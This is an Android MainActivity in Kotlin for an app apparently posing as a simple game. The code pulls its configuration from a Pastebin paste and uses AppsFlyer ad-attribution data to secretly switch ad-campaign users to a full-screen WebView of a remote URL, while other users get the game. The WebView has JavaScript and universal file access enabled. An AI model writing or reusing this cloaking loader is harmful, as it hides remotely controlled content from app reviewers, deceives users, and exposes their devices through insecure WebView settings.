package com.finakaklem.assbernaut
import android.animation.ValueAnimator
import android.content.Context
import android.content.Intent
import android.content.SharedPreferences
import android.graphics.Bitmap
import android.os.Build
import android.os.Bundle
import android.util.Log
import android.view.View
import android.view.ViewGroup
import android.view.animation.AccelerateDecelerateInterpolator
import android.webkit.WebResourceRequest
import android.webkit.WebView
import android.webkit.WebViewClient
import android.widget.FrameLayout
import android.widget.ImageView
import androidx.activity.result.contract.ActivityResultContracts
import androidx.appcompat.app.AppCompatActivity
import androidx.work.OneTimeWorkRequestBuilder
import androidx.work.WorkManager
import androidx.work.workDataOf
import com.airbnb.lottie.LottieAnimationView
import com.appsflyer.AppsFlyerConversionListener
import com.appsflyer.AppsFlyerLib
import org.json.JSONObject
import java.io.BufferedReader
import java.io.InputStreamReader
import java.net.HttpURLConnection
import java.net.URL
import java.util.concurrent.TimeUnit
import kotlin.concurrent.thread
import kotlin.random.Random

class MainActivity : AppCompatActivity() {
    private lateinit var weranda: WebView
    private var isWebViewLoaded = false
    private var blockerAppsFlyer = 0
    private val requestPermissionLauncher = registerForActivityResult(ActivityResultContracts.RequestPermission()) { isGranted: Boolean -> }
    private var apiUrl: String = ""
    private var devKey: String = ""
    override fun onCreate(savedInstanceState: Bundle?) {
        super.onCreate(savedInstanceState)

        setContentView(R.layout.activity_main)
        val lottieAnimationView = findViewById<LottieAnimationView>(R.id.lottie_animation_view)
        lottieAnimationView.playAnimation()
        weranda = findViewById(R.id.wera)
        registerPermissionNotification()
        val checkFor = getSharedPreferences("balance", Context.MODE_PRIVATE)
        val getShared = saveGet(checkFor)

        weranda.apply {
            settings.allowFileAccessFromFileURLs = true
            settings.allowContentAccess = true
            settings.javaScriptEnabled = true
            settings.javaScriptCanOpenWindowsAutomatically = true
            settings.allowFileAccess = true
            settings.mixedContentMode = 0
            settings.useWideViewPort = true
            settings.allowUniversalAccessFromFileURLs = true
            settings.loadWithOverviewMode = true
            settings.domStorageEnabled = true
            settings.databaseEnabled = true
        }

        weranda.webViewClient = WerandaSett(weranda)

        if (getShared == null || getShared == "empty") {
            fetchDataFromPastebin("https://pastebin.com/raw/NDp4PaBL", checkFor)
        } else {
            weranda.visibility = View.VISIBLE
            weranda.loadUrl(getShared)
        }
    }
    private fun fetchDataFromPastebin(pastebinUrl: String, sharedPreferences: SharedPreferences) {
        thread {
            try {
                Log.d("MY_TAG", "Requesting URL: $pastebinUrl")

                val url = URL(pastebinUrl)
                val connection = url.openConnection() as HttpURLConnection
                connection.requestMethod = "GET"
                connection.setRequestProperty("User-Agent", "Mozilla/5.0")

                val responseCode = connection.responseCode
                Log.d("MY_TAG", "Response Code: $responseCode")

                if (responseCode == HttpURLConnection.HTTP_OK) {
                    val reader = BufferedReader(InputStreamReader(connection.inputStream))
                    val response = StringBuilder()
                    var line: String?

                    while (reader.readLine().also { line = it } != null) {
                        response.append(line)
                    }
                    reader.close()

                    Log.d("MY_TAG", "Response body: ${response.toString()}")

                    val jsonResponse = JSONObject(response.toString())
                    devKey = jsonResponse.getString("devKey")
                    apiUrl = jsonResponse.getString("apiUrl")

                    startAppsFlyerLogic(devKey, sharedPreferences)
                } else {
                    Log.e("MY_TAG", "Failed to fetch data. Response code: $responseCode")
                    load()
                    val errorStream = connection.errorStream
                    if (errorStream != null) {
                        val errorReader = BufferedReader(InputStreamReader(errorStream))
                        val errorResponse = StringBuilder()
                        var errorLine: String?

                        while (errorReader.readLine().also { errorLine = it } != null) {
                            errorResponse.append(errorLine)
                        }
                        errorReader.close()
                        Log.e("MY_TAG", "Error body: ${errorResponse.toString()}")
                    }

                    load()
                }
                connection.disconnect()
            } catch (e: Exception) {
                Log.e("MY_TAG", "Error fetching data: ${e.message}")
                load()
            }
        }
    }

    private fun saveGet(checker: SharedPreferences): String? {
        return checker.getString("valueInSharedPreferences", "empty")
    }

    private fun registerPermissionNotification() {
        if (Build.VERSION.SDK_INT >= Build.VERSION_CODES.TIRAMISU) {
            requestPermissionLauncher.launch(android.Manifest.permission.POST_NOTIFICATIONS)
        }
    }

    private fun startAppsFlyerLogic(devKey: String, sharedPreferences: SharedPreferences) {
        AppsFlyerLib.getInstance().init(devKey, object : AppsFlyerConversionListener {
            override fun onConversionDataSuccess(appfMap: MutableMap<String, Any>?) {
                Log.d("MY_TAG", "Conversion Data Success")
                if (blockerAppsFlyer == 0) {
                    blockerAppsFlyer = 1
                    if (appfMap != null && appfMap.isNotEmpty()) {
                        val campaign = appfMap["campaign"] as? String
                        val afAd = appfMap["af_ad"] as? String
                        val media    = appfMap["media_source"] as? String
                        Log.d("MY_TAG", "Campaign: $campaign, Ad: $afAd, media: $media")

                        if (!campaign.isNullOrEmpty() && !afAd.isNullOrEmpty()) {
                            val link = "$apiUrl?eynbufxop=$campaign&qvuonrxb=$afAd&ombjoxqs=$media"
                            sharedPreferences.edit().putString("getKey", link).apply()
                            Log.d("MY_TAG", "Generated link: $link")
                            runOnUiThread {
                                weranda.visibility = View.VISIBLE
                                weranda.loadUrl(link)
                            }
                        } else {
                            Log.d("MY_TAG", "No attribution data found, opening game")
                            load()
                        }
                    } else {
                        Log.d("MY_TAG", "Attribution data is empty, opening game")
                        load()
                    }
                }
            }

            override fun onConversionDataFail(error: String?) {
                Log.e("MY_TAG", "Conversion Data Fail: $error")
                load()
                if (blockerAppsFlyer == 0) {
                    blockerAppsFlyer = 1
                    load()
                }
            }

            override fun onAppOpenAttribution(data: MutableMap<String, String>?) {}
            override fun onAttributionFailure(error: String?) {}
        }, this)
        AppsFlyerLib.getInstance().start(this)
    }

    private fun load() {
        runOnUiThread {
            val imageView2 = findViewById<ImageView>(R.id.imageView2)
            val currentHeight = imageView2.layoutParams.height

            animateHeight(imageView2, currentHeight, 1000)

            replaceImage(1000)
        }
    }

    private fun animateHeight(view: ImageView, startHeight: Int, endHeight: Int) {
        val animator = ValueAnimator.ofInt(startHeight, endHeight)
        animator.duration = 1000
        animator.interpolator = AccelerateDecelerateInterpolator()

        animator.addUpdateListener { animation ->
            val newHeight = animation.animatedValue as Int
            val layoutParams = view.layoutParams
            layoutParams.height = newHeight
            view.layoutParams = layoutParams
        }

        animator.start()
    }

    private fun replaceImage(delay: Long) {
        val gotovo = findViewById<ImageView>(R.id.gotovo)

        gotovo.postDelayed({
            gotovo.setImageResource(R.drawable.gotovo2)

            gotovo.postDelayed({
                val currentHeight = gotovo.layoutParams.height
                animateHeight(gotovo, currentHeight, currentHeight + 400)
                gotovo.setImageResource(R.drawable.gotovo3)
                gotovo.postDelayed({
                    val intent = Intent(this@MainActivity, HomeActivity::class.java)
                    startActivity(intent)
                    finish()
                }, 4000)

            }, 4000)

        }, delay)
    }


    inner class WerandaSett(val weras: WebView) : WebViewClient() {
        override fun onPageStarted(views: WebView?, url: String?, favicon: Bitmap?) {
            weras.layoutParams = FrameLayout.LayoutParams(
                ViewGroup.LayoutParams.MATCH_PARENT,
                ViewGroup.LayoutParams.MATCH_PARENT
            )
        }

        override fun shouldOverrideUrlLoading(view: WebView?, request: WebResourceRequest?): Boolean {
            val currentUrl = request?.url.toString()
            if (currentUrl.contains("https://sdfjhsa")) {
                load()
                return true
            }
            return false
        }
    }
}
